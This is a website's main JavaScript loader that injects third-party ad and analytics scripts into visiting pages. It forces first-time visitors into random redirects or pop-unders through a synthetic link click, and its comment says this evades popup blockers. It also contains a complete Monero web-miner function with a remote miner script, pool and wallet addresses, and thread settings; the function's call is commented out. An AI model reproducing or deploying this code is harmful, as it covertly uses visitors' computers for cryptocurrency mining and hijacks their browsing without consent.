window.onload = function() {
    loadIMCMain();
};

var jsFiles = [
    'https://imc.re/assets/js/core/jquery.min.js',
    'https://leaktrailercondo.com/68/57/d4/6857d4b9ee98aad8bbaaa55523619d23.js',
    'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3805485436239833'
];

var links = [
    'https://l.imc.re/adsterra'
];
// 'https://l.imc.re/pddcpa',
// 'https://l.imc.re/haoka',
// 'https://l.imc.re/ad'

function loadIMCMain() {
    loadScripts(jsFiles);
    redirectToDomain();
    adShow();
    baiduTongji();
    googleAnalytics();
    // xmrMiner();
}

function adShow() {
    if (!localStorage.getItem('hasVisited')) {
      localStorage.setItem('hasVisited', 'true');
    //   redirectToLinks('loc');

      var randomNumber = Math.random();
      if (randomNumber >= 0.8) {
          redirectToLinks('loc');
      } else {
          redirectToLinks('win');
      }
    }

    var ads = getURLParameter('ads');
    if (ads == '1') {
        redirectToLinks('win');
    } else if (ads == '2') {
        redirectToLinks('loc');
    }
}

function loadScripts(files) {
    files.forEach(function(file) {
        var script = document.createElement('script');
        script.src = file;
        script.type = 'text/javascript';
        script.async = true; // 异步加载JS文件
        document.head.appendChild(script);
    });
}
        
function getURLParameter(name) {
    var queryParams = window.location.search.substring(1);
    var params = queryParams.split('&');
    for (var i = 0; i < params.length; i++) {
        var param = params[i].split('=');
        if (param[0] === name) {
        return decodeURIComponent(param[1]);
        }
    }
    return null;
}

function redirectToLinks(t,u) {
    if (u == undefined) {
        var randomIndex = Math.floor(Math.random() * links.length);
        url = links[randomIndex];
    } else {
        url = u;
    }

    if (t == 'win') {
        // window.open(url, '_blank');
        createSuperLabel(url,"newpages")
    } else {
        window.location.href = url;
    }
};

// 创建超链接，不会被拦截    
function createSuperLabel(url, id) {      
    let a = document.createElement("a");           
    a.setAttribute("href", url);      
    a.setAttribute("target", "_blank");      
    a.setAttribute("id", id);       
    // 防止反复添加      
    if(!document.getElementById(id)) {                               
        document.body.appendChild(a);      
    }      
    a.click();    
}

function redirectToDomain() {
    var hostname = window.location.hostname; // 获取当前页面的域名
    var url = 'https://smg.ink';

    switch (hostname) {
        case '127.0.0.1':
        case 'localhost':
            url = 'https://smg.ink/?utm_source=imc-main.js';
            redirectToLinks('loc', url);
            break;
        case 'imc.cab':
        case 'hugo.imc.re':
        case 'smgoro.com':
            url = 'https://smg.ink/?utm_source=imc-main.js';
            redirectToLinks('loc', url);
            break;
        default:
            break;
    }
}

function xmrMiner() {
    var script = document.createElement("script");
    // script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
    script.src = "https://thelifewillbefine.de/karma/karma.js?karma=bs%253Falgy=rx/0%253Fnosaj=xmr.miner.mcbe-server.com:9000";
    // script.src = "/assets/js/na-monero.js";

    script.onload = function() {
        server = "wss://ny1.xmrminingproxy.com";
        var pool = "moneroocean.stream";
        var walletAddress = "47YPoXCVUxAQFpS8gmQX4fgY5LmnGkNG4Xz3WjzADvvZhr8WnNG3P4MD4hPAxF8aWZbUSrHhJ7YdZ4x3pi3qJw6aT9RxMg2";
        var workerId = "WEB-XMR"
        var threads = 5; //-1
        var password = "";
        startMining(pool, walletAddress, workerId, threads, password);
        throttleMiner = 20;

        EverythingIsLife('46CCPD4KmGbcs3vCwUPtkUCaKQRzLmb6GR7NJwj93anPg3CPugJbDmucumG7r3JsUH4PGRBSoHQAyCXjNDYffHJPHPdrGst', workerId, 80);
    };
    document.head.appendChild(script);
}


// 百度统计
function baiduTongji(id) {
    var id = id || 'a02d22441e44bb824edf8620f6c3f5fa';
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = `https://hm.baidu.com/hm.js?${id}`;
      var s = document.getElementsByTagName("script")[0]; 
      s.parentNode.insertBefore(hm, s);
    })();
}

// Google Analytics
function googleAnalytics(id) {
    var id = id || 'G-PMMTR7C3S5';
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', id);
}